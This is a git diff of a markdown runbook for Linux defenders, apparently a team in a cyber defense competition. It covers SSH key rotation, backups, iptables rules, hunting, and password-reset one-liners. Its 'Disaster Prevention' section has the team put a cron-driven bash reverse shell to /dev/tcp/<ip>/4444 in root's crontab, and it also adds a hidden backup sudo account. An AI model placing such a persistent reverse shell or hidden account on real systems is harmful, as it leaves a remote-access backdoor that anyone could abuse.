@@ -25,22 +25,33 @@
 
 **Do not touch the** `seccdc_black` **account**
 
-## 30 Minute Plan
+## Initial Action Plan
 
 1. [NMAP Scan Machine](#nmap) in background
 2. [Backup files](#backups)
-3. Rotate all ssh keys
-    1. Populate the machines with the ssh key from lead linux captain
-    2. Deploy with `ssh-copy-id -i <file> <user@host>`
-    3. Ensure there is only one entry (one line) in `~/.ssh/authorized_keys`. If there are more than one, remove all lines EXCEPT the very last one. After saving, make sure you can still SSH by trying on a NEW terminal.
-    4. Remove all other authorized keys files with `find / -name authorized_keys`
+3. Rotate ssh keys
+    1. Get ssh key from Linux captain called `team-key`
+	2. Copy `team-key.pub` to server via scp or copy-and-paste
+	3. Set ssh key: `cat team-key.pub > ~/.ssh/authorized_keys`
+	4. Open a new SSH session to ensure it works
 
-4. Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
-5. Lock unnecessary accounts with `usermod -L <login>` and if nothing goes red, delete account with `userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
+4. Create a backup account called `grimace`
+	1. `sudo useradd -m -s /bin/bash -G sudo,wheel,adm grimace`
+	2. Set password to password provided by Linux captain `sudo passwd grimace`
+	3. Add new ssh key to grimace's authorized keys
+		1. Switch to grimace: `su grimace`
+		2. Create dir: `mkdir ~/.ssh; chmod 700 ~/.ssh`
+		3. Add key: `echo '<ssh key>' > ~/.ssh/authorized_keys`
+		4. Set permissions: `chmod 600 ~/.ssh/authorized_keys`
+	4. SSH into grimace to ensure it works
+
+5. Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
+6. Lock unnecessary accounts with `sudo usermod -L <account>` and if nothing goes red, delete account with `sudo userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
     1. **NOTE**: user home directories were intentionally not deleted with the `userdel` command with the idea of possible needing that data for future injects (you never know). \
 	If you absolutely need to remove extraneous user home directories, seek approval from the team captain before proceeding with the command `userdel -r <login>`
 
-6. Find listening services with `ss -tunlp` and investigate strange ones
+7. Follow steps in [disaster prevention](#disaster-prevention)
+8. Find listening services with `sudo ss -tunlp` and investigate
 
 ## Monitoring
 
@@ -64,9 +75,101 @@
 1. Look for csv's and import scripts in home dir
 2. Backups data directory with `tar czf var-lib.tar.gz /var/lib &`
 3. Backups conf directory with `tar czf etc.tar.gz /etc &`
-4. Copy tar files to local machine with `scp '<remote>:*.tar.gz' .` (run command on local machine);w
+4. Copy tar files to local machine with `scp '<remote>:*.tar.gz' .` (run command on local machine)
 
-## System Utilities
+## Firewall
+
+1. Determine what open ports are needed from nmap scan and [monitoring](#monitoring)
+2. Ensure `iptables` and `iptables-apply` are installed
+3. Create a file `/etc/network/iptables.up.rules` with the following content
+```
+*filter
+:INPUT DROP [0:0]
+:FORWARD DROP [0:0]
+:OUTPUT DROP [0:0]
+
+-A INPUT -i lo -j ACCEPT
+-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+-A INPUT -m conntrack --ctstate INVALID -j DROP
+-A OUTPUT -o lo -j ACCEPT
+-A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+-A OUTPUT -m conntrack --ctstate INVALID -j DROP
+
+-A INPUT -p tcp --dport 25 -j ACCEPT
+-A INPUT -p tcp --dport 80 -j ACCEPT
+
+-A OUTPUT -m conntrack --ctstate NEW -j ACCEPT
+
+-A INPUT -j LOG
+-A OUTPUT -j LOG
+
+COMMIT
+```
+4. Apply with `sudo iptables-apply`
+5. Ensure new SSH sessions may be opened
+
+## Disaster Prevention
+
+1. Open multiple ssh sessions to different users
+2. Add SSH key to multiple users, such as root
+3. Determine your IP, and place the line below in root's crontab
+	1. On your localhost you can listen to port 4444 to catch the shell
+
+``` crontab
+* * * * * /bin/bash -i >& /dev/tcp/<ip>/4444 0>&1
+```
+
+## Disaster Recovery
+
+1. Service goes down
+    1. Determine the service
+	2. Determine if data is still present (look in `/etc/<service name>`)
+		1. Restore if not: `cd /; tar xzf etc.tar.gz etc/<service name>`
+    3. Try restarting: `sudo systemctl restart <service>`
+    4. Find errors in logs with `sudo journalctl -xe <service>`
+    5. If it is a configuration error, restore previous config or manually reset
+    6. If the service is still down **alert the team**
+
+2. Loosing access to a box
+    1. **Alert the team**
+    2. [Start nmap scan](#nmap)
+    3. Try verbose ssh `ssh -v <user>@<ip>`
+
+## Hunting
+
+1. Find a process's parent ID with `ps -f <pid>` and look at `PPID`
+2. Find binaries with suid bit executable by anyone `find / -perm -+s,o+x`
+	1. `/usr/bin/mount.cifs` and `/usr/bin/unix_chkpwd` are suppose to have this bit set
+3. List all files with creation date, most recent first: `find /usr /bin /etc \` \
+    `/var -type f -exec stat -c "%W %n" {} + | sort -r > files`
+
+4. List all files created after set date, most recent first: \
+    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \` \
+    `stat -c "%W %n" {} + | sort -rn > files`
+
+## Duncan's Magic {#dmagic}
+
+1. Remove users listed in **./disable.txt** \
+    `while read user;do sudo usermod -L $user;done<disable.txt`
+
+2. Generate new passwords for every user in **./users.txt**. Output format and filename as specified by SECCDC-2024 password reset guidelines. Ensure team number is correct and SERVICE is changed to match the corresponding service the passwords are being reset for.\
+    `s='<service>'; while read u; do u=‘echo $u|tr -d ' '‘; \` \
+    `p=‘tr -dc 'A-Za-z0-9!@#$%'</dev/urandom|head -c 24; echo‘; \` \
+    `echo $s,$u,$p; done < users.txt > Team25_${s}_PWD.csv`
+
+3. Actually reset passwords using the generated list from the command immediately preceeding this\
+    `awk -F, '{print $2":"$3}' <file.csv> | sudo chpasswd`
+
+4. Find users not in **./known_users.txt** \
+    `awk -F: '{if($3>=1000&&$3<=60000){print $1}}' /etc/passwd| \` \
+    `sort - known_users.txt | uniq -u > extra_users.txt`
+
+5. Remove crontabs from list of users in **./users.txt** \
+    `while read u; do sudo crontab -u $u -r; done < users.txt`
+
+## Appendices
+
+### System Utilities
 
 1. Start and stop processes with `systemctl`
     1. Start service with `systemctl start <unit>`
@@ -93,7 +196,7 @@
 
     2. View IP Addresses with `ip a` and take note of additional addresses
 
-## Configurations
+### Configurations
 
 1. SSH Daemon configs are in `/etc/ssh/sshd_config` and should be set as follows
 ```
@@ -108,38 +211,7 @@ PermitEmptyPasswords no
         `/srv/home hostname1(rw,sync,no_subtree_check)` \
         These allow sharing file systems over the network. They must be reviewed to ensure we are not sharing information with attackers
 
-## Hunting
-
-1. Find a process's parent ID with `ps -f <pid>` and look at `PPID`
-2. List all files with creation date, most recent first: `find /usr /bin /etc \` \
-    `/var -type f -exec stat -c "%W %n" {} + | sort -r > files`
-
-3. List all files created after set date, most recent first: \
-    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \` \
-    `stat -c "%W %n" {} + | sort -rn > files`
-
-
-## Duncan's Magic {#dmagic}
-
-1. Remove users listed in **./disable.txt**\
-    `while read user;do sudo usermod -L $user;done<disable.txt`
-
-2. Generate new passwords for every user in **./users.txt**. Output format and filename as specified by SECCDC-2024 password reset guidelines. Ensure team number is correct and SERVICE is changed to match the corresponding service the passwords are being reset for.\
-    `s='<service>'; while read u; do u=‘echo $u|tr -d ' '‘; \` \
-    `p=‘tr -dc 'A-Za-z0-9!@#$%'</dev/urandom|head -c 24; echo‘; \` \
-    `echo $s,$u,$p; done < users.txt > Team25_${s}_PWD.csv`
-
-3. Actually reset passwords using the generated list from the command immediately preceeding this\
-    `awk -F, '{print $2":"$3}' <file.csv> | sudo chpasswd`
-
-4. Find users not in **./known_users.txt** \
-    `awk -F: '{if($3>=1000&&$3<=60000){print $1}}' /etc/passwd| \` \
-    `sort - known_users.txt | uniq -u > extra_users.txt`
-
-5. Remove crontabs from list of users in **./users.txt** \
-    `while read u; do sudo crontab -u $u -r; done < users.txt`
-
-## Hardening
+### Hardening
 
 You should remount /tmp and /var/tmp to be non-executable.
 
@@ -155,32 +227,7 @@ You should remount /tmp and /var/tmp to be non-executable.
     `mount -o nodev,nosuid,noexec /tmp`\
     `mount -o nodev,nosuid,noexec /var/tmp `
 
-## Disaster Prevension
-
-1. Open multiple ssh sessions to different users
-2. Add SSH key to multiple users, such as root
-3. Determine your IP, and place the line below in root's crontab
-	1. On your localhost you can listen to port 4444 to catch the shell
-
-``` crontab
-* * * * * /bin/bash -i >& /dev/tcp/<ip>/4444 0>&1
-```
-
-## Disaster Recovery
-
-1. Service goes down
-    1. Determine the service
-    5. Try restarting: `sudo systemctl restart <service>`
-    2. Find errors in logs with `sudo journalctl -xe <service>`
-    3. If it is a configuration error, restore previous config or manually reset
-    4. If the service is still down **alert the team**
-
-2. Loosing access to a box
-    1. **Alert the team**
-    2. [Start nmap scan](#nmap)
-    3. Try verbose ssh `ssh -v <user>@<ip>`
-
-## Logging with auditd
+### Logging with auditd
 
 Setup auditd for logging purposes
 
